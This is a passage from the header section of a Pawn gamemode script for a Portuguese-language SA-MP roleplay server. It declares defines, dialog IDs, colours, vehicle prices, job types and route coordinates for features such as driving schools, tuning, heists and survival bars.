#include	< a_samp >
#include 	< streamer >
#include 	< foreach >
#include 	< mSelection >
#include    < progress >
#include    < cpstream >
#include 	< WE >
#include    < OPSPWE >
#include    < sscanf2 >

#define @Callback:%0(%1) \
    forward%0(%1); public%0(%1)

#define Loop(%0,%1) \
	for(new %0 = 0; %0 < %1; %0++)

#define 	GivePlayerCash(%0,%1)	SetPVarInt(%0,"Money",GetPlayerCash(%0)+%1),GivePlayerMoney(%0,%1)
#define 	ResetPlayerCash(%0) 	SetPVarInt(%0,"Money",0),ResetPlayerMoney(%0)
#define 	GetPlayerCash(%0) 		GetPVarInt(%0,"Money")

#define 	SetPlayerHoldingObject(%1,%2,%3,%4,%5,%6,%7,%8,%9) SetPlayerAttachedObject(%1,MAX_PLAYER_ATTACHED_OBJECTS-1,%2,%3,%4,%5,%6,%7,%8,%9)
#define 	StopPlayerHoldingObject(%1) RemovePlayerAttachedObject(%1,MAX_PLAYER_ATTACHED_OBJECTS-1)
#define 	IsPlayerHoldingObject(%1) IsPlayerAttachedObjectSlotUsed(%1,MAX_PLAYER_ATTACHED_OBJECTS-1)

#define COLOR_FADE1     0xE6E6E6E6
#define COLOR_FADE2     0xC8C8C8C8
#define COLOR_FADE3     0xAAAAAAAA
#define COLOR_FADE4     0x8C8C8C8C
#define COLOR_FADE5     0x6E6E6E6E

#define DIALOG_MENSAGEM      6900

//Auto-Escola
#define D_AUTOESCOLA 		 8080
#define D_AUTOESCOLAMOTO     8081
#define D_AUTOESCOLACARRO    8082
#define D_AUTOESCOLACAMINHAO 8083
#define D_AUTOESCOLATREM     8084
#define D_AUTOESCOLABARCO    8085
#define D_AUTOESCOLAAVIAO    8086
#define D_AUTOESCOLAHELI     8087

new alvosammu[4];
new
	ObjetosAmmuCheck,
	ObjetosAmmuCheck2,
	//ObjetosAmmuCheck3,
	bool:ObjetosAmmuOn,
	bool:ObjetosAmmuOn2
	//bool:ObjetosAmmuOn3
;

new
	bool:tPistol[MAX_PLAYERS],
	bool:tShotgun[MAX_PLAYERS],
	bool:tMicro[MAX_PLAYERS],
	bool:tSMG[MAX_PLAYERS],
	bool:tRifle[MAX_PLAYERS],
	bool:tSniper[MAX_PLAYERS]
;

new PontosTiro[MAX_PLAYERS];

// /tunar de mecanico
forward OnPlayerInfoChange(playerid);
forward OnPlayerPrivmsg(playerid, recieverid, text[]);

new Menu:TuningMenu;
new Menu:TuningMenu1;
new Menu:Paintjobs;
new Menu:Colors;
new Menu:Colors1;
new Menu:Exhausts;
new Menu:Frontbumper;
new Menu:Rearbumper;
new Menu:Roof;
new Menu:Spoilers;
new Menu:Sideskirts;
new Menu:Bullbars;
new Menu:Wheels;
new Menu:Wheels1;
new Menu:Carstereo;

new Menu:Hydraulics;
new Menu:Nitro;
//------------------------------------------------------------------------------
/**
* NEWS PILOTO
*/
new ViagemPiloto[MAX_PLAYERS];
new TimerPiloto[MAX_PLAYERS];
new PassageirosPiloto[MAX_PLAYERS];

//IGREJA//
new tapete[6];
new paredeinteriorigreja[24];
new chaoigreja[9];
new portasigreja[4];
new tetoigreja[6];

// CASAMENTO //
new
	bool:RequisitouCasar[MAX_PLAYERS],
	ProntoCasamento[MAX_PLAYERS]
	/*Padre_ID[MAX_PLAYERS],
	Casar_PID[MAX_PLAYERS],
	bool:EmCasamento[MAX_PLAYERS]*/
;

// AGÊNCIA //
new
	CancelaAg,
	bool:CancelaAgAB
;

// CEONCESSIONÁRIA //
new conceblue[20];
new suscarro[15];

//----- BANCO WE ------ //
new paredesexterior[20];
new colunasbanco[19];
new janelasbanco[9];
new paredesinteriorbanco[43];
new tetointeriorbanco[13];

//Mecânica
new
	CancelaMec,
	PortaoMec,
	bool:CancelaAb,
	bool:PortaoMAb
;

//Prisão
new
	elevadordp,
	portaelevador[2],
	ParedesGeralDp[12],
	ParedesGeralDp1[90],
	TetosGeralDp1[3],
	TetosGeralDp[22],
	celas[10],
	portacelas
;

new DPWE;

new
	PortaoDP,
	CancelaDP
;

//------------------------------------ Moto ------------------------------------
new InAutoEscola[MAX_PLAYERS];
new carroauto[MAX_PLAYERS];
new Checks[MAX_PLAYERS];

new Float:MortoCama[4][4] =
{
	{305.0270,254.3260,997.7818,92.8644},
	{302.5316,254.3468,997.7818,88.7208},
	{300.1406,254.5356,997.7818,86.9856},
	{297.5598,254.4141,997.7818,94.0240}
};

new Float:STruck[2][4] =
{
	{1725.3906,-634.1582,41.4722,6.4895},
	{1723.9718,-650.9548,42.8577,10.1378}
};

new Float:SCars[2][4] =
{
	{1692.6036,-1085.2380,23.7037,0.5424},
	{1704.8579,-1069.2972,23.7037,180.2360}
};

new Float:AutoPoints[18][3] =
{
    {1616.3485,-1132.6362,23.6333}, // Saída
    {1637.2360,-1153.7490,23.6333}, // CP 1
    {1687.3986,-1162.5488,23.3833}, // CP 2
    {1797.2849,-1177.7280,23.3732}, // CP 3
    {1845.8792,-1245.6350,13.8073}, // CP 4
    {1808.5771,-1456.5826,13.0830}, // CP 5
    {1694.4156,-1438.3116,13.1099}, // CP 6
    {1532.8011,-1438.9048,13.1099}, // CP 7
    {1457.1876,-1386.9346,13.1099}, // CP 8
    {1506.1361,-1305.1414,13.9832}, // CP 9
    {1693.7174,-1305.1704,13.2705}, // CP 10
    {1716.8748,-1254.0295,13.1184}, // CP 11
    {1717.3589,-1174.0961,23.3819}, // CP 12
    {1703.3695,-1158.5835,23.3847}, // CP 13
    {1650.9957,-1158.8624,23.5774}, // CP 14
    {1640.3180,-1147.7327,23.6333}, // CP 15
    {1640.0210,-1109.8925,23.6367}, // CP 16
    {1648.8837,-1093.5571,23.6333}  // CP Final
};
//----------------------------------- Carro ------------------------------------
new InAutoEscola2[MAX_PLAYERS];
new carroauto2[MAX_PLAYERS];
new Checks2[MAX_PLAYERS];
new Float:AutoPoints2[39][3] =
{
    {1679.1595,-1077.4736,23.6960}, // cp 1
    {1653.5532,-1070.4294,23.6974}, // cp 2
    {1636.3158,-1108.1034,23.7047}, // cp 3
    {1634.9210,-1150.0879,23.7038}, // cp 4
    {1621.7694,-1158.3058,23.6941}, // cp 5
    {1542.8237,-1158.2515,23.7038}, // cp 6
    {1449.7969,-1158.3015,23.4639}, // cp 7
    {1398.9316,-1143.1858,23.4537}, // cp 8
    {1368.8796,-1137.9230,23.4489}, // cp 9
    {1367.7476,-1079.2867,24.9293}, // cp 10
    {1372.4854,-1002.2735,27.6511}, // cp 11
    {1379.8197,-959.0654,33.8968}, // cp 12
    {1372.1855,-937.2775,33.9846}, // cp 13
    {1343.1161,-931.7165,35.0035}, // cp 14
    {1285.0181,-925.3571,41.2063}, // cp 15
    {1181.0809,-942.5740,42.5589}, // cp 16
    {1068.4734,-952.3754,42.4872}, // cp 17
    {974.3603,-963.4905,39.2748}, // cp 18
    {959.8548,-982.3267,38.6111}, // cp 19
    {960.2216,-1026.9232,30.4418}, // cp 20
    {960.0228,-1059.5100,27.8042}, // cp 21
    {960.0684,-1128.2870,23.4635}, // cp 22
    {986.8598,-1148.2616,23.7361}, // cp 23
    {1034.9365,-1148.6688,23.4538}, // cp 24
    {1056.0814,-1161.7854,23.5588}, // cp 25
    {1056.3947,-1209.1890,17.1747}, // cp 26
    {1056.5626,-1262.3667,14.0963}, // cp 27
    {1102.0647,-1283.0586,13.2886}, // cp 28
    {1173.1045,-1283.2653,13.2943}, // cp 29
    {1328.4723,-1282.5895,13.1802}, // cp 30
    {1360.0859,-1268.0525,13.1802}, // cp 31
    {1372.2150,-1243.1597,13.1793}, // cp 32
    {1441.6484,-1243.2256,13.1803}, // cp 33
    {1457.2355,-1173.5527,23.4841}, // cp 34
    {1525.2521,-1163.3030,23.7040}, // cp 35
    {1623.2333,-1163.5886,23.6938}, // cp 36
    {1640.3373,-1147.7125,23.7036}, // cp 37
    {1642.6707,-1089.8348,23.7038}, // cp 38
    {1640.6425,-1046.7218,23.6959} // cp 39 Final
};
//---------------------------------- Caminhão ----------------------------------
new InAutoEscola3[MAX_PLAYERS];
new carroauto3[MAX_PLAYERS];
new Checks3[MAX_PLAYERS];
new Float:AutoPoints3[39][3] =
{
    {1721.5342,-583.8690,37.9549}, // cp 1
    {1695.7196,-407.4305,36.4336}, // cp 2
    {1679.5120,-197.6806,40.8908}, // cp 3
    {1637.8876,11.9681,37.2587}, // cp 4
    {1659.5682,216.8413,30.9157}, // cp 5
    {1723.9790,249.6764,18.6801}, // cp 6
    {1970.3383,289.5471,34.0971}, // cp 7
    {2179.0083,309.2747,33.6229}, // cp 8
    {2375.5527,311.6229,33.2705}, // cp 9
    {2506.4822,291.9061,30.1872}, // cp 10
    {2631.0413,305.7485,38.4018}, // cp 11
    {2730.5662,244.2963,33.1599}, // cp 12
    {2755.4519,156.5875,21.1967}, // cp 13
    {2755.8181,64.4713,28.1527}, // cp 14
    {2753.2458,-49.0975,35.1173}, // cp 15
    {2730.6543,-167.9099,32.1979}, // cp 16
    {2695.8855,-272.9866,30.3478}, // cp 17
    {2690.5085,-355.6911,28.9806}, // cp 18
    {2738.2341,-430.5355,17.4407}, // cp 19
    {2763.7996,-472.3938,11.8777}, // cp 20
    {2833.0752,-581.2941,11.4245}, // cp 21
    {2843.7346,-652.6803,11.4259}, // cp 22
    {2836.6025,-1007.1318,22.4833}, // cp 23
    {2866.1084,-1348.6398,11.5068}, // cp 24
    {2853.1372,-1559.7831,11.5258}, // cp 25
    {2821.5383,-1636.7505,11.4014}, // cp 26
    {2839.0752,-1659.7006,11.3019}, // cp 27
    {2842.0093,-1701.8444,11.4813}, // cp 28
    {2831.3269,-1757.9830,11.4814}, // cp 20
    {2820.9595,-1872.6033,11.5889}, // cp 30
    {2820.4751,-2011.9951,11.5397}, // cp 31
    {2809.2620,-2101.2246,11.5399}, // cp 32
    {2515.0691,-2153.1257,13.9811}, // cp 33
    {2397.4600,-2167.8743,13.9809}, // cp 34
    {2315.0796,-2235.2664,13.9815}, // cp 35
    {2282.4500,-2245.6926,14.1205}, // cp 36
    {2254.2361,-2217.6855,13.9334}, // cp 37
    {2227.0085,-2221.4207,14.1484},// cp 38
    {2168.9612,-2282.6484,14.0739} // cp 39 Final
};
//----------------------------------- Barco ------------------------------------
new InAutoEscola4[MAX_PLAYERS];
new carroauto4[MAX_PLAYERS];
new Checks4[MAX_PLAYERS];
new Float:AutoPoints4[16][3] =
{
    {2290.4309,-2501.4788,-0.2784}, // cp 1
    {2294.7419,-2646.3335,0.3207}, // cp 2
    {2308.5894,-2686.0889,-0.6820}, // cp 3
    {2347.9292,-2619.6477,-0.4440}, // cp 4
    {2351.5984,-2509.1199,-0.0889}, // cp 5
    {2431.8657,-2382.4414,-0.2809}, // cp 6
    {2518.8359,-2311.4707,-0.5050}, // cp 7
    {2780.3479,-2302.2175,-0.3545}, // cp 8
    {2861.0566,-2459.7751,-0.6729}, // cp 9
    {2844.6218,-2558.6538,0.2454}, // cp 10
    {2739.1851,-2591.6199,0.1844}, // cp 11
    {2555.0535,-2650.6997,0.1566}, // cp 12
    {2458.3936,-2723.4619,0.1388}, // cp 13
    {2351.1636,-2576.7375,-0.5180}, // cp 14
    {2354.6877,-2431.9280,-0.3759}, // cp 15
    {2307.7490,-2415.6257,-0.0893} // cp 16 Final
};
//----------------------------------- Avião ------------------------------------
new InAutoEscola5[MAX_PLAYERS];
new carroauto5[MAX_PLAYERS];
new Checks5[MAX_PLAYERS];
new Float:AutoPoints5[2][3] =
{
    {-1536.1824,-72.3377,15.5437}, // cp inicial
    {2056.5159,-2447.3201,14.9196} // cp Final
};
//------------------------------- Helicoptero ----------------------------------
new InAutoEscola6[MAX_PLAYERS];
new carroauto6[MAX_PLAYERS];
new Checks6[MAX_PLAYERS];
new Float:AutoPoints6[2][3] =
{
    {1545.1505,-1352.9768,329.4881}, // cp inicial
    {2093.6899,2413.9785,74.5884} // cp Final
};
//------------------------------------------------------------------------------
/**
* BUG TEXTDRAW
*/

//Tutorial
new Text:BaseTuto[4];
new PlayerText:TutoText[MAX_PLAYERS][6];
new TutoID[MAX_PLAYERS];
new bool:TutoLiberado[MAX_PLAYERS];
new Text:BancoTuto[5];
new Text:PrefeituraTuto[4];
new Text:AutoEscolaTuto[4];
new Text:DelegaciaTuto[5];
new Text:HospitalTuto[5];
new Text:PostoTuto[3];
new Text:UtilTuto[3];
new Text:SkinTuto[3];
new Text:NeedsTuto[4];

//Basquete
new HavingBall[MAX_PLAYERS];
new Anim[MAX_PLAYERS];
new Ball;
new BallStatus;
new Baller;
new ShootingBall;
new BallBounce;

//Megaphone
new MegaphoneSounds[][] =
{
	{
		"9605,Entregue-se. Você está cercado!"},
	{
		"9612,Nós sabemos que você está ai!"},
	{
		"10200,Ei você! Polícia. Pare!"},
	{
		"15800,Aqui é o departamento de polícia; Fique onde está!"},
	{
		"15801,Parado! Ou abriremos fogo!"},
	{
		"15802,Vai! Vai! Vai!"},
	{
		"34402,Polícia! Não se mova!"},
	{
		"34403,Sai do carro com as mãos pra cima!"},
	{
		"15825,LSPD. Pare... você está louco? Vai matar a todos nós!"}
};

#define DIALOG_MEGAPHONE_MENU  10201

//Cofre
new Vault;
new VaultBroken[5];
new bool:CofreAberto;
//----------------------------- DriveThru --------------------------------------
/*Cores*/
#define     VERMELHO    0xFF0000FF
#define     AZUL        0x1E90FFFF

/*Dialog*/
#define		DriveThru  8000
#define     Bebida     8010
#define     Lanche     8020
//#define     Sobremesa  8030
#define     DVS        8040
new StrBebT[1000];
//---------------------------- FomeSedeSono Dialog -----------------------------
#define         D_BEBS1	       	  2218
#define         D_BEBSAL2         2219
#define         D_CMDA3           2220
#define         D_LCHS4           2221
#define         D_TEST            2222
#define         D_CARDAPIO        2223
#define         PastaFSS      	  "/FSS/%s.ini"
/**
* VARIAVEIS FOME, SEDE E SONO
*/
#define         BAR_FOME        	0
#define         BAR_SEDE        	1
#define         BAR_SONO       	 	2
//------------------------------------------------------------------------------
//new Text:TextFome, Text:TextSede, Text:TextSono;
//new Text:FSSBox[3], Text:IconeFSS[3];
new Text:Player_barEat[MAX_PLAYERS];
new Text:Player_barDrink[MAX_PLAYERS];
new Text:Player_barSleep[MAX_PLAYERS];
new Text:Textdraw0S;
new Text:Textdraw1S;
new Text:Textdraw2;
new Text:Textdraw4;
new Text:Textdraw5;
new Text:Textdraw6;
new Text:Textdraw8;
new Text:Textdraw9;
new Text:Textdraw10;
new Text:Textdraw11;
new ContagemSono[MAX_PLAYERS], ContagemSede[MAX_PLAYERS], ContagemFome[MAX_PLAYERS];
new bool:lanchonete[MAX_PLAYERS];
new arquivos2[30];
new BS10;
new RBD17;
new CB9;
new WSP5;
new JD4;
new ZEU;

enum p_bar
{
    pl_v,
    Float:pl_m
}

new Player_Bars[MAX_BARS][p_bar];
//------------------------------------------------------------------------------
new bool:mFome[MAX_PLAYERS], bool:mSede[MAX_PLAYERS], bool:Alugou[MAX_PLAYERS];
//------------------------------------------------------------------------------
new Float:RandomSpawns[8][3] =
{
    {2244.4512,-1159.6351,1029.7969}, //Quarto 1
    {2238.6926,-1159.6136,1029.7969}, //Quarto 2
    {2238.4946,-1170.6606,1029.7969}, //Quarto 3
    {2225.6917,-1185.7908,1029.7969}, //Quarto 4
    {2209.5791,-1191.3101,1029.7969}, //Quarto 5
    {2196.1775,-1173.0626,1029.8043}, //Quarto 6
    {2190.6311,-1156.9851,1029.7969}, //Quarto 7
    {2196.1338,-1157.1234,1029.7969} //Quarto 8
};
//-------------------------------- FSS -----------------------------------------

//Pedágio
//#define sleep2(%0);  for(new _@%0; _@%0 != (%0*40000000);) (_@%0++); //By. Rjjj

#define D_VIAFACIL  5416

new ViaFacil[MAX_PLAYERS];
new bool:Pedagio[MAX_PLAYERS] = {false, ...};
new CancelaP[MAX_PLAYERS][4];
new bool:PassouPedagio[MAX_PLAYERS];

//#define COMMUNICATION "25.3.83.160"

//AntiVehicle
new
    vehicleTime[MAX_PLAYERS],
    lastVehicle[MAX_PLAYERS]
;

new
	gstring[500]
;

#define 	SendClientFormat(%1,%2,%3,%4) do{format(gstring,sizeof(gstring),%3,%4);SendClientMessage(%1,%2,gstring);}while(IsPlayerConnected(-1))
#define 	SendClientFormatAll(%1,%2,%3) do{format(gstring,sizeof(gstring),%2,%3);SendClientMessageToAll(%1,gstring);}while(IsPlayerConnected(-1))

#define Kick(%0) SetTimerEx("Kicka", 100, false, "i", %0)
#define Ban(%0)  SetTimerEx("Bana", 100, false, "i", %0)

#define 	PRESSED(%0) (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define 	RELEASED(%0) (((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))

#define 	ARMEDBODY_USE_HEAVY_WEAPON	(false)

#define     MES_LIMITE (01)
#define     ANO_LIMITE (2015)

#define		ACTION			(2)	/*	0 = BANIR | 1 = KICKAR | 2 = RETIRAR ARMA	*/
#define 	RC_BANDIT    	441
#define 	RC_BARON  		464
#define 	RC_GOBLIN  		501
#define 	RC_RAIDER  		465
#define 	D_TRAM   		449
#define 	RC_MINITANK   	564
#define 	RC_CAM   		594
//-- Dialogs
#define     D_LOGIN			0
#define     D_REGISTRO		1
#define     D_SEXO          2
#define     D_SPAWN         3
#define     D_CARGA         4
#define		D_iCASA         5
#define     D_vINDEX        6
#define		D_vCARROS       7
#define		D_vMOTOS        8
#define		D_vLISTA1   	9 	// A - B
#define 	D_vLISTA2   	10 	// B
#define 	D_vLISTA3   	11 	// C - D
#define 	D_vLISTA4   	12 	// F - H
#define 	D_vLISTA5   	13 	// I - M
#define 	D_vLISTA6   	14 	// N - P
#define 	D_vLISTA7   	15 	// R - S
#define 	D_vLISTA8   	16 	// S
#define 	D_vLISTA9   	17 	// T - Z
//#define          18
#define		D_CONTABANCO    19
#define 	D_LOGINBANCO    20
#define 	D_SENHABANCO    21
#define 	D_SENHABANCO2   22
#define 	D_iBANCO        23
#define 	D_TRANSACAO     24
#define 	D_DEPOSITO      25
#define 	D_SAQUE         26
#define     D_SALDO         27
#define     D_DEPOSITOU     28
#define     D_SACOU		    29
#define 	D_EMPRINFO      30
#define     D_TUTO          31
#define     D_TUTO1         32
#define     D_TUTO2         33
#define     D_TUTO3         34
#define     D_TUTO4         35
#define     D_TUTO5         36
#define     D_TUTO6         37
#define     D_TUTO7         38
#define     D_TUTO8         39
#define     D_TUTO9         40
#define     D_TUTO10      	41
#define     D_TUTO11        42
#define     D_TUTO12        43
#define     D_TUTO13        44
#define     D_TUTO14        45
#define     D_TUTO15        46
/*#define     D_LJSKIN        47
#define     D_EPSKIN        48
#define     D_CPSKIN        49
#define     D_VOSKIN        50*/
#define     D_PROFS   		51
#define     D_TRANS         52
#define     D_TRANP         53
#define     D_PARTI         54
#define     D_POLIC         55
#define     D_GOVER         56
#define     D_CRIME         57
#define     D_OUTRA         58
#define     D_OUTR2         59
#define     D_ISPAW         60
#define     D_LUTAS         61
#define		D_AUTOE         62
#define		D_UTILI         63
#define		D_GPSL1         6400
#define		D_HOSPI         65
#define		D_TEMPO         66
#define		D_FAVEL         67
#define		D_HTDOG         68
#define		D_SORVE         69
#define		D_ALGOD         70
#define		D_NEON_         71
#define		D_ITEN1         72
#define		D_ITEN2         73
#define		D_ITEN3         74
#define		D_ITEN4         75
#define		D_DROGA         76
#define		D_SPORG         78
#define		D_BALAO         79
#define		D_BALA2         80
#define		D_BALA3         81
#define		D_BALA4         82
#define		D_SUSPE         83
#define		D_NITRO         84
#define		D_RODAS         85
#define		D_PAINT         86
#define		D_TUNIN         87
//#define		D_GASOL         88
#define		D_EMAIL	        89
//#define     D_PCHAVL        90
#define     D_PESCAD        92
#define     D_PAULCAR       93
#define     D_PARMA         94
#define		D_GPSLS         9500
#define		D_GPSSF         9600
#define		D_GPSLV         9700
#define		D_CELLL         98
#define     D_AJUDA         99
#define     D_PEDAGIO       100
#define     D_RADIOS        101
#define     D_MOTIVOS       102
#define     D_CARGOS        103
#define     D_PATENTES      104
#define     D_ASSALTOS      105
#define     D_TERRESTRE     106
#define     D_NAUTICA       107
#define     D_AEREA         108
#define     D_PETROLEO      109
#define     D_PILOTO        110
//-- Cores
#define     COR_CEU 			  0x0065FDFF
#define		COR_ERRO			  0xFF0000AA
#define     COR_AZULESCURO		  0x000099AA
#define     COR_AZUL			  0x0000FFAA
#define     COR_AZULCLARO     	  0x0099FFAA
#define     COR_AZULBEBE      	  0x00CCFFAA
#define     COR_AZULAGUA      	  0x00FFFFAA
#define     COR_VERDEESCURO   	  0x006633AA
#define     COR_VERDE             0x009933AA
#define     COR_VERDECLARO        0x00FF66AA
#define     COR_VERDELIMAO        0x00FF33AA
#define     COR_VERDEAGUA         0x00FF99AA
#define     COR_ROXOESCURO        0x330033AA
#define     COR_ROXO              0x330066AA
#define     COR_ROXOCLARO         0x333366AA
#define     COR_ROXOAGUA          0x6600CCAA
#define     COR_ROXOFRACO         0x6666CCAA
#define     COR_VERMELHOESCURO    0xCC0000AA
#define     COR_VERMELHOCLARO     0xFF0033AA
#define     COR_VERMELHOAGUA      0xFF3333AA
#define     COR_LARANJAESCURO     0xFF3300AA
#define     COR_LARANJA           0xFF6600AA
#define     COR_LARANJAAGUA       0xFF6633AA
#define     COR_ROSAESCURO        0xFF0066AA
#define     COR_ROSA              0xFF0099AA
#define     COR_ROSACLARO         0xFF33FFAA
#define     COR_ROSAAGUA          0xFF66FFAA
#define     COR_AMARELOESCURO     0xFFCC00AA
#define     COR_AMARELO           0xFFFF00AA
#define     COR_AMARELOCLARO      0xFAF65DFF
#define     COR_AMARELOAGUA       0xFFFF99AA
#define     COR_BRANCO            0xFFFFFFFF
#define     COR_CINZAESCURO       0x333333AA
#define     COR_CINZA             0x6E6E6EFF
#define     COR_CINZACLARO        0xB4B4B4FF
#define     COR_SISTEMA           0xA9C4E4FF
#define     COR_MUSGO             0x698B22AA
#define     COR_MARROMCLARO 	  0xBDB76BAA
#define     COR_VERDEFRACO        0xC1FFC1FF
#define     COR_TUNING            0x22C579FF
#define     AZUL_WE               0x1E90FFFF
#define     VERMELHO_WE           0xFF1E1EFF
//-- Cores das Profs
#define     COR_DESEMPREGADO      0xFFE2C2FF
#define     COR_MOTORISTABUS      0xFC4C47FF
#define     COR_TAXISTA           0xD5D500AA
#define     COR_PILOTOPAR         0x00B3B3AA
#define     COR_MOTOTAXI          0x009B00AA
#define     COR_CAMINHONEIRO      0xDAE8CEAA
#define     COR_MAQUINISTA        0x00EA75AA
#define     COR_TRANSPORTADOR     0x00FF62FF
#define     COR_SEGPART           0x81C4FFFF
#define     COR_MOTPART           0x444CF4FF
#define     COR_GUARDTRANS        0xF4680EFF
#define     COR_POLCIVIL          0x8CB972FF
#define     COR_POLMILITAR        0x006AD5AA
#define     COR_POLRODOVIARIO     0x8080FFAA
#define     COR_POLFEDERAL        0x0600B0AA
#define     COR_JUIZ              0x584674FF
#define     COR_TRAFDROGAS        0xD8A100FF
#define     COR_TRAFARMAS         0xBA3500FF
#define     COR_HITMAN            0x737373FF
#define     COR_ATIRADOR       	  0x600A17FF
#define     COR_TERRORISTA        0xFF0000FF
#define     COR_CHEFEMAFIA        0x01DFA2FF
#define     COR_SEGILHA           0x80FF00AA
#define     COR_PORILHA           0x53A600AA
#define     COR_PIZZABOY          0x99FFCCAA
#define     COR_FOTOGRAFO         0xA68082FF
#define     COR_REPORTER          0x972C82FF
#define		COR_DRIFTER		      0x4B766EFF
#define     COR_DEPUTADO          0xD688A5FF
#define     COR_PREFEITO          0x5959ACAA
#define     COR_GOVERNADOR        0x00FF40AA
#define     COR_EXERCITO          0x5A7620FF
#define     COR_INSTRUTOR         0x313131AA
#define 	COR_MECANICO		  0x657DDFFF
#define     COR_PESCADOR          0x336699AA
#define     COR_PILOTO            0x627A00FF
#define     COR_MEDICO            0xDF0070AA
#define     COR_ADVOGADO          0x182C66FF
#define     COR_VENDEDORSKINS     0xB9B973AA
#define     COR_FRENTISTA         0xC9A000FF
#define     COR_PADRE             0xB64B7FFF
#define     COR_PROSTITUTA        0xFF6AFFAA
#define     COR_SEGVILA           0x808080AA
#define     COR_PORVILA           0x97B7A6AA
#define     COR_CONTRABANDISTA	  0xAD0000AA
#define     COR_BOMBEIRO		  0xFA8072AA
#define     COR_PETROLEIRO        0x8A2BE2AA
//-- Profissoes
#define     DESEMPREGADO            0
#define     MOTORISTA_ONIBUS        1
#define     TAXISTA                 2
#define     MOTO_TAXISTA            3
#define     PILOTO_PART             4
#define     CAMINHONEIRO            5
#define     MAQUINISTA              6
#define     TRANSPORTADOR           7
#define     SEGURANCA_PART          8
#define     MOTORISTA_PART          9
#define     GUARDA_TRANSITO         10
#define     POL_CIVIL               11
#define     POL_MILITAR             12
#define     POL_RODOVIARIO          13
#define     POL_FEDERAL             14
#define     JUIZ                    15
#define     TRAF_DROGAS             16
#define     TRAF_ARMAS              17
#define     HITMAN                  18
#define     ATIRADOR                19
#define     TERRORISTA				20
#define     CHEFE_MAFIA             21
#define     SEG_ILHA                22
#define     PORT_ILHA               23
#define     PIZZABOY                24
#define     FOTOGRAFO               25
#define     REPORTER                26
#define     DRIFTER					27
#define     DEPUTADO				28
#define     PREFEITO                29
#define     GOVERNADOR              30
#define     EXERCITO		        31
#define     INSTRUTOR             	32
#define     MECANICO                33
#define     PESCADOR             	34
#define     PILOTO					35
#define     MEDICO     				36
#define     ADVOGADO                37
#define     VENDEDOR_SKINS          38
#define     FRENTISTA               39
#define     PADRE                   40
#define     PROSTITUTA              41
#define     SEG_VILA                42
#define     PORT_VILA               43
#define     CONTRABANDISTA        	44
#define     BOMBEIRO        		45
#define     PETROLEIRO              46
//	   ---	   ESPIAR
#define 	ADMIN_SPEC_TYPE_NONE 	0
#define 	ADMIN_SPEC_TYPE_PLAYER	1
//	   ---	   Preço veículos
#define 	PRECO_ADMIRAL 			30000
#define 	PRECO_ALPHA 			64000
#define 	PRECO_BANSHEE           215000
#define 	PRECO_BANDITO 			32000
#define 	PRECO_BF_INJECTION 		20000
#define 	PRECO_BLADE 			60000
#define 	PRECO_BLISTA_COMPACT 	15000
#define 	PRECO_BLOODRING_BANGER 	45000
#define 	PRECO_BOBCAT 			32000
#define 	PRECO_BOXVILLE 			26000
#define 	PRECO_BRAVURA 			33000
#define 	PRECO_BROADWAY 			64000
#define 	PRECO_BUCCANEER 		40000
#define 	PRECO_BUFFALO 			140000
#define 	PRECO_PERENNIEL         19000
#define 	PRECO_BULLET            425000
#define 	PRECO_BURRITO 			48000
#define 	PRECO_CAMPER 			14500
#define 	PRECO_CHEETAH 			330000
#define 	PRECO_CLOVER 			25000
#define 	PRECO_CLUB 				47000
#define 	PRECO_COMET             30500
#define 	PRECO_ELEGANT 			49000
#define 	PRECO_ELEGY 			98000
#define 	PRECO_EMPEROR 			55000
#define 	PRECO_ESPERANTO 		22000
#define 	PRECO_EUROS 			74000
#define 	PRECO_FELTZER 			33000
#define 	PRECO_FLASH 			82000
#define 	PRECO_GLENDALE 			26000
#define 	PRECO_GREENWOOD 		20000
#define 	PRECO_HERMES 			41000
#define 	PRECO_HOTKNIFE 			66000
#define 	PRECO_HOTRING 			200000
#define 	PRECO_HUNTLEY 			160000
#define 	PRECO_HUSTLER 			59000
#define 	PRECO_INFERNUS          600000
#define 	PRECO_JESTER 			140000
#define 	PRECO_KART 				14000
#define 	PRECO_LANDSTALKER       130000
#define 	PRECO_MAJESTIC 			37000
#define 	PRECO_MESA 				56000
#define 	PRECO_MOONBEAM 			51000
#define 	PRECO_PERENNIEL 		19000
#define 	PRECO_PHOENIX 			245000
#define 	PRECO_PICADOR 			21000
#define 	PRECO_RANCHER 			84000
#define 	PRECO_REMINGTON 		57000
#define 	PRECO_SABRE 			45000
#define 	PRECO_SADLER 			24000
#define 	PRECO_SANDKING 			80000
#define 	PRECO_SAVANNA 			78000
#define 	PRECO_SLAMVAM 			45000
#define 	PRECO_STAFFORD          175000
#define 	PRECO_STRATUM 			67500
#define 	PRECO_STRETCH           105000
#define 	PRECO_SULTAN 			74000
#define 	PRECO_SUNRISE 			51000
#define 	PRECO_SUPER_GT 			220000
#define 	PRECO_TORNADO 			63000
#define 	PRECO_TURISMO 			500000
#define 	PRECO_URANOS 			77000
#define 	PRECO_VINCENT 			42000
#define 	PRECO_VIRGO 			22000
#define 	PRECO_VOODOO 			53000
#define 	PRECO_WALTON 			7500
#define 	PRECO_WASHINGTON 		67000
#define 	PRECO_WILLARD 			37000
#define 	PRECO_YOSEMITE 			77000
#define 	PRECO_ZR_350 			127500
#define 	PRECO_BF_400            10000
#define 	PRECO_BIKE 				300
#define 	PRECO_BMX               750
#define 	PRECO_FAGGIO 			5000
#define 	PRECO_FCR_900 			40000
#define 	PRECO_FREEWAY 			74500
#define 	PRECO_NRG_500 			89000
#define 	PRECO_PCJ_600 			12500
#define 	PRECO_QUAD 				7500
#define 	PRECO_SANCHEZ 			10000
#define 	PRECO_WAYFARER 			20000
#define 	PRECO_URANUS 			75000

//Corregedoria
new IsNotCop[MAX_PLAYERS];

//Assalto
new FimAssalto[MAX_PLAYERS],
	ProxRoubo[MAX_PLAYERS],
	AnimRoubo[MAX_PLAYERS],
	PlantarBomba[MAX_PLAYERS],
	pBombas[MAX_PLAYERS],
	BolsaDinheiro[MAX_PLAYERS],
	bool:Roubou[MAX_PLAYERS],
	bool:PortaBanco[MAX_PLAYERS],
	bool:Roubando[MAX_PLAYERS],
	bool:ComBolsa[MAX_PLAYERS],
	bool:bRoubado
;

#define D_BOMBAS	5500

//Ammunation
#define D_TREINOAMMU 5505

// Anti-Bot
enum iI
{
    IncomingIP[16],
    IncomingVezes,
    IncomingTempo
}//

// Lojas de Roupas
new
	skins_binco = mS_INVALID_LISTID,
	skins_didiersachs = mS_INVALID_LISTID,
	skins_prolaps = mS_INVALID_LISTID,
